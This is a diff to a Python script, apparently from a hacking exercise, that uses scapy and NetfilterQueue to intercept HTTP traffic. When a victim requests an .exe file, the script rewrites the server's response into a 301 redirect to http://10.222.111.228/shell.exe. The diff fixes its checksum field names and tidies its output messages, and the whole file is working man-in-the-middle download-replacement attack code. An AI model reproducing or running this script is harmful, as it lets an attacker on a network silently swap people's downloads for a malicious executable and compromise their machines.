@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 import argparse
 import scapy.all as scapy
-from scapy.layers import http
 import netfilterqueue
 
 
@@ -27,8 +26,8 @@ ack_list = []
 def set_load(packet, load):
     packet[scapy.Raw].load = load
     del packet[scapy.IP].len
-    del packet[scapy.IP].chcksum
-    del packet[scapy.TCP].chcksum
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
     return packet
 
 
@@ -37,14 +36,14 @@ def process_packet(packet):
     if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
         if scapy_packet[scapy.TCP].dport == 80:
             if ".exe" in str(scapy_packet[scapy.Raw].load):
-                print("[+] .exe Request]")
+                print("[+] .exe Request")
                 ack_list.append(scapy_packet[scapy.TCP].ack)
         elif scapy_packet[scapy.TCP].sport == 80:
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+] Replacing file..")
-                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://10.222.111.228/shell.exe\n\n")
-                print(scapy_packet.show())
+                http_redirect = "HTTP/1.1 301 Moved Permanently\nLocation: http://10.222.111.228/shell.exe\n\n"
+                modified_packet = set_load(scapy_packet, http_redirect)
                 packet.set_payload(bytes(modified_packet))
     packet.accept()  # Forwards packets
     # packet.drop()  # Drops packets
@@ -55,6 +54,6 @@ print("[+] Initiating HTTP Modifier..")
 print("[+] Setting up NetfilterQueue..")
 queue = netfilterqueue.NetfilterQueue()
 queue.bind(int(options.queue_number), process_packet)
-print("[+] Monitoring for HTTP records in queue number " + str(options.queue_number))
+print("[+] Monitoring HTTP packets on queue " + str(options.queue_number) + "..")
 queue.run()
 
